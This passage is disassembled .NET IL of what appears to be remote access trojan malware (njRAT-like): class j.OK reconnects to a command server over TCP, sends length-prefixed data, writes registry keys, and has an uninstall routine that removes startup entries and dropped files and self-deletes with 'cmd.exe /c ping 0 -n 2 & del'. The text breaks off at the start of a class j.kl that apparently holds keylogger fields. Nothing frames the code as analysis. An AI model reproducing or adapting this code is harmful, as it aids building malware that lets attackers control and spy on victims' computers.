      IL_01a6:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_01ab:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01b0:  br         IL_0019

      IL_01b5:  leave.s    IL_01d2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01b7:  dup
      IL_01b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01bd:  stloc.s    V_7
      IL_01bf:  ldloc.s    V_7
      IL_01c1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01c6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01d0:  leave.s    IL_01d2

    }  // end handler
    IL_01d2:  nop
    .try
    {
      IL_01d3:  ldsfld     object j.OK::PLG
      IL_01d8:  brfalse.s  IL_0200

      IL_01da:  ldsfld     object j.OK::PLG
      IL_01df:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_01e4:  ldnull
      IL_01e5:  ldstr      "clear"
      IL_01ea:  ldc.i4.0
      IL_01eb:  newarr     [mscorlib]System.Object
      IL_01f0:  ldnull
      IL_01f1:  ldnull
      IL_01f2:  ldnull
      IL_01f3:  ldc.i4.1
      IL_01f4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_01f9:  pop
      IL_01fa:  ldnull
      IL_01fb:  stsfld     object j.OK::PLG
      IL_0200:  leave.s    IL_021d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0202:  dup
      IL_0203:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0208:  stloc.s    V_8
      IL_020a:  ldloc.s    V_8
      IL_020c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0211:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0216:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_021b:  leave.s    IL_021d

    }  // end handler
    IL_021d:  ldc.i4.0
    IL_021e:  stsfld     bool j.OK::Cn
    IL_0223:  call       bool j.OK::connect()
    IL_0228:  brfalse.s  IL_01d2

    IL_022a:  ldc.i4.1
    IL_022b:  stsfld     bool j.OK::Cn
    IL_0230:  br         IL_0000
  } // end of method OK::RC

  .method public static uint8[]  SB(string& S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000c:  ret
  } // end of method OK::SB

  .method public static bool  Send(string S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldarga.s   S
    IL_0002:  call       uint8[] j.OK::SB(string&)
    IL_0007:  call       bool j.OK::Sendb(uint8[])
    IL_000c:  ret
  } // end of method OK::Send

  .method public static bool  Sendb(uint8[] b) cil managed
  {
    // Code size       232 (0xe8)
    .maxstack  5
    .locals init (bool V_0,
             object V_1,
             class [mscorlib]System.IO.MemoryStream V_2,
             int32 V_3,
             uint8[] V_4,
             string V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7)
    IL_0000:  ldsfld     bool j.OK::Cn
    IL_0005:  brtrue.s   IL_000e

    IL_0007:  ldc.i4.0
    IL_0008:  stloc.0
    IL_0009:  br         IL_00e6

    IL_000e:  nop
    .try
    {
      IL_000f:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0014:  stloc.1
      IL_0015:  ldloc.1
      IL_0016:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_001b:  ldsfld     bool j.OK::Cn
        IL_0020:  brtrue.s   IL_0029

        IL_0022:  ldc.i4.0
        IL_0023:  stloc.0
        IL_0024:  leave      IL_00e6

        IL_0029:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_002e:  stloc.2
        IL_002f:  ldarg.0
        IL_0030:  ldlen
        IL_0031:  conv.i4
        IL_0032:  stloc.3
        IL_0033:  ldloca.s   V_3
        IL_0035:  call       instance string [mscorlib]System.Int32::ToString()
        IL_003a:  ldstr      bytearray (00 00 ) 
        IL_003f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0044:  stloc.s    V_5
        IL_0046:  ldloca.s   V_5
        IL_0048:  call       uint8[] j.OK::SB(string&)
        IL_004d:  stloc.s    V_4
        IL_004f:  ldloc.2
        IL_0050:  ldloc.s    V_4
        IL_0052:  ldc.i4.0
        IL_0053:  ldloc.s    V_4
        IL_0055:  ldlen
        IL_0056:  conv.i4
        IL_0057:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_005c:  ldloc.2
        IL_005d:  ldarg.0
        IL_005e:  ldc.i4.0
        IL_005f:  ldarg.0
        IL_0060:  ldlen
        IL_0061:  conv.i4
        IL_0062:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0067:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_006c:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0071:  ldloc.2
        IL_0072:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0077:  ldc.i4.0
        IL_0078:  ldloc.2
        IL_0079:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_007e:  conv.ovf.i4
        IL_007f:  ldc.i4.0
        IL_0080:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_0085:  pop
        IL_0086:  leave.s    IL_008f

      }  // end .try
      finally
      {
        IL_0088:  ldloc.1
        IL_0089:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_008e:  endfinally
      }  // end handler
      IL_008f:  leave.s    IL_00e0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0091:  dup
      IL_0092:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0097:  stloc.s    V_6
      IL_0099:  ldloc.s    V_6
      IL_009b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      .try
      {
        IL_00a0:  ldsfld     bool j.OK::Cn
        IL_00a5:  brfalse.s  IL_00b7

        IL_00a7:  ldc.i4.0
        IL_00a8:  stsfld     bool j.OK::Cn
        IL_00ad:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00b2:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
        IL_00b7:  leave.s    IL_00d4

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00b9:  dup
        IL_00ba:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00bf:  stloc.s    V_7
        IL_00c1:  ldloc.s    V_7
        IL_00c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00c8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00d2:  leave.s    IL_00d4

      }  // end handler
      IL_00d4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00de:  leave.s    IL_00e0

    }  // end handler
    IL_00e0:  ldsfld     bool j.OK::Cn
    IL_00e5:  stloc.0
    IL_00e6:  ldloc.0
    IL_00e7:  ret
  } // end of method OK::Sendb

  .method public static bool  STV(string n,
                                  object t,
                                  valuetype [mscorlib]Microsoft.Win32.RegistryValueKind typ) cil managed
  {
    // Code size       86 (0x56)
    .maxstack  4
    .locals init (bool V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldarg.1
      IL_0025:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002f:  ldarg.2
      IL_0030:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object,
                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0035:  ldc.i4.1
      IL_0036:  stloc.0
      IL_0037:  leave.s    IL_0054

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0039:  dup
      IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003f:  stloc.1
      IL_0040:  ldloc.1
      IL_0041:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0046:  ldc.i4.0
      IL_0047:  stloc.0
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0052:  leave.s    IL_0054

    }  // end handler
    IL_0054:  ldloc.0
    IL_0055:  ret
  } // end of method OK::STV

  .method public static void  UNS() cil managed noinlining nooptimization
  {
    // Code size       705 (0x2c1)
    .maxstack  4
    .locals init (string V_0,
             string[] V_1,
             int32 V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             string V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11)
    IL_0000:  call       class My.MyComputer My.MyProject::get_Computer()
    IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_000a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
    IL_000f:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_ProgramFiles()
    IL_0014:  stloc.0
    IL_0015:  call       string[] [mscorlib]System.IO.Directory::GetLogicalDrives()
    IL_001a:  stloc.1
    IL_001b:  ldc.i4.0
    IL_001c:  stloc.2
    IL_001d:  br.s       IL_0057

    IL_001f:  ldloc.1
    IL_0020:  ldloc.2
    IL_0021:  ldelem.ref
    IL_0022:  stloc.0
    .try
    {
      IL_0023:  ldloc.0
      IL_0024:  ldsfld     string j.OK::RG
      IL_0029:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_002e:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0033:  brfalse.s  IL_0045

      IL_0035:  ldloc.0
      IL_0036:  ldsfld     string j.OK::RG
      IL_003b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0040:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0045:  leave.s    IL_0053

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0051:  leave.s    IL_0053

    }  // end handler
    IL_0053:  ldloc.2
    IL_0054:  ldc.i4.1
    IL_0055:  add.ovf
    IL_0056:  stloc.2
    IL_0057:  ldloc.2
    IL_0058:  ldloc.1
    IL_0059:  ldlen
    IL_005a:  conv.i4
    IL_005b:  blt.s      IL_001f

    IL_005d:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_0062:  ldstr      "sand.dat"
    IL_0067:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_006c:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_0071:  brfalse.s  IL_0097

    .try
    {
      IL_0073:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_0078:  ldstr      "sand.dat"
      IL_007d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0082:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0087:  leave.s    IL_0097

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0089:  dup
      IL_008a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_008f:  stloc.3
      IL_0090:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0095:  leave.s    IL_0097

    }  // end handler
    IL_0097:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_009c:  ldstr      "select.dat"
    IL_00a1:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_00a6:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_00ab:  brfalse.s  IL_00d2

    .try
    {
      IL_00ad:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_00b2:  ldstr      "select.dat"
      IL_00b7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00bc:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_00c1:  leave.s    IL_00d2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00c3:  dup
      IL_00c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c9:  stloc.s    V_4
      IL_00cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d0:  leave.s    IL_00d2

    }  // end handler
    IL_00d2:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_00d7:  ldstr      "scream.wav"
    IL_00dc:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_00e1:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_00e6:  brfalse.s  IL_010d

    .try
    {
      IL_00e8:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_00ed:  ldstr      "scream.wav"
      IL_00f2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00f7:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_00fc:  leave.s    IL_010d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00fe:  dup
      IL_00ff:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0104:  stloc.s    V_5
      IL_0106:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_010b:  leave.s    IL_010d

    }  // end handler
    IL_010d:  ldc.i4.0
    IL_010e:  call       void j.OK::pr(int32)
    IL_0113:  ldc.i4.0
    IL_0114:  stsfld     bool j.OK::Isu
    .try
    {
      IL_0119:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_011e:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0123:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0128:  ldsfld     string j.OK::sf
      IL_012d:  ldc.i4.1
      IL_012e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0133:  ldsfld     string j.OK::RG
      IL_0138:  ldc.i4.0
      IL_0139:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_013e:  leave.s    IL_015b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0140:  dup
      IL_0141:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0146:  stloc.s    V_6
      IL_0148:  ldloc.s    V_6
      IL_014a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_014f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0154:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0159:  leave.s    IL_015b

    }  // end handler
    IL_015b:  nop
    .try
    {
      IL_015c:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0161:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0166:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_016b:  ldsfld     string j.OK::sf
      IL_0170:  ldc.i4.1
      IL_0171:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0176:  ldsfld     string j.OK::RG
      IL_017b:  ldc.i4.0
      IL_017c:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_0181:  leave.s    IL_019e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0183:  dup
      IL_0184:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0189:  stloc.s    V_7
      IL_018b:  ldloc.s    V_7
      IL_018d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0192:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0197:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_019c:  leave.s    IL_019e

    }  // end handler
    IL_019e:  nop
    .try
    {
      IL_019f:  ldsfld     bool j.OK::HIDE_ME
      IL_01a4:  brfalse.s  IL_01c9

      IL_01a6:  ldsfld     string j.OK::DR
      IL_01ab:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_01b0:  ldstr      "\\"
      IL_01b5:  ldsfld     string j.OK::EXE
      IL_01ba:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01bf:  ldc.i4     0x80
      IL_01c4:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                        valuetype [mscorlib]System.IO.FileAttributes)
      IL_01c9:  ldc.i4.7
      IL_01ca:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_01cf:  ldstr      "\\"
      IL_01d4:  ldsfld     string j.OK::RG
      IL_01d9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01de:  call       string [mscorlib]System.IO.Path::GetFileNameWithoutExtension(string)
      IL_01e3:  stloc.s    V_8
      IL_01e5:  ldc.i4.7
      IL_01e6:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_01eb:  ldstr      "\\"
      IL_01f0:  ldloc.s    V_8
      IL_01f2:  ldstr      ".url"
      IL_01f7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_01fc:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0201:  ldc.i4.7
      IL_0202:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0207:  ldstr      "\\"
      IL_020c:  ldsfld     string j.OK::RG
      IL_0211:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0216:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_021b:  leave.s    IL_0238

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_021d:  dup
      IL_021e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0223:  stloc.s    V_9
      IL_0225:  ldloc.s    V_9
      IL_0227:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_022c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0231:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0236:  leave.s    IL_0238

    }  // end handler
    IL_0238:  nop
    .try
    {
      IL_0239:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_023e:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0243:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0248:  ldstr      "Software"
      IL_024d:  ldc.i4.1
      IL_024e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0253:  ldsfld     string j.OK::RG
      IL_0258:  ldc.i4.0
      IL_0259:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKey(string,
                                                                                             bool)
      IL_025e:  leave.s    IL_027b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0260:  dup
      IL_0261:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0266:  stloc.s    V_10
      IL_0268:  ldloc.s    V_10
      IL_026a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_026f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0274:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0279:  leave.s    IL_027b

    }  // end handler
    IL_027b:  nop
    .try
    {
      IL_027c:  ldstr      "cmd.exe /c ping 0 -n 2 & del \""
      IL_0281:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0286:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_028b:  ldstr      "\""
      IL_0290:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0295:  ldc.i4.0
      IL_0296:  ldc.i4.0
      IL_0297:  ldc.i4.m1
      IL_0298:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_029d:  pop
      IL_029e:  leave.s    IL_02bb

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02a0:  dup
      IL_02a1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02a6:  stloc.s    V_11
      IL_02a8:  ldloc.s    V_11
      IL_02aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02b4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02b9:  leave.s    IL_02bb

    }  // end handler
    IL_02bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_02c0:  ret
  } // end of method OK::UNS

  .method public static uint8[]  ZIP(uint8[] B) cil managed
  {
    // Code size       105 (0x69)
    .maxstack  4
    .locals init (class [mscorlib]System.IO.MemoryStream V_0,
             class [System]System.IO.Compression.GZipStream V_1,
             uint8[] V_2,
             int32 V_3,
             uint8[] V_4)
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_0006:  stloc.0
    IL_0007:  ldloc.0
    IL_0008:  ldc.i4.0
    IL_0009:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_000e:  stloc.1
    IL_000f:  ldc.i4.4
    IL_0010:  newarr     [mscorlib]System.Byte
    IL_0015:  stloc.2
    IL_0016:  ldloc.0
    IL_0017:  ldloc.0
    IL_0018:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_001d:  ldc.i4.5
    IL_001e:  conv.i8
    IL_001f:  sub.ovf
    IL_0020:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0025:  ldloc.0
    IL_0026:  ldloc.2
    IL_0027:  ldc.i4.0
    IL_0028:  ldc.i4.4
    IL_0029:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_002e:  pop
    IL_002f:  ldloc.2
    IL_0030:  ldc.i4.0
    IL_0031:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_0036:  stloc.3
    IL_0037:  ldloc.0
    IL_0038:  ldc.i4.0
    IL_0039:  conv.i8
    IL_003a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_003f:  ldloc.3
    IL_0040:  ldc.i4.1
    IL_0041:  sub.ovf
    IL_0042:  ldc.i4.1
    IL_0043:  add.ovf
    IL_0044:  ldc.i4.1
    IL_0045:  sub.ovf
    IL_0046:  ldc.i4.1
    IL_0047:  add.ovf
    IL_0048:  newarr     [mscorlib]System.Byte
    IL_004d:  stloc.s    V_4
    IL_004f:  ldloc.1
    IL_0050:  ldloc.s    V_4
    IL_0052:  ldc.i4.0
    IL_0053:  ldloc.3
    IL_0054:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_0059:  pop
    IL_005a:  ldloc.1
    IL_005b:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0060:  ldloc.0
    IL_0061:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0066:  ldloc.s    V_4
    IL_0068:  ret
  } // end of method OK::ZIP

} // end of class j.OK

.class public auto ansi j.kl
       extends [mscorlib]System.Object
{
  .field private string LastAS
  .field private int32 LastAV
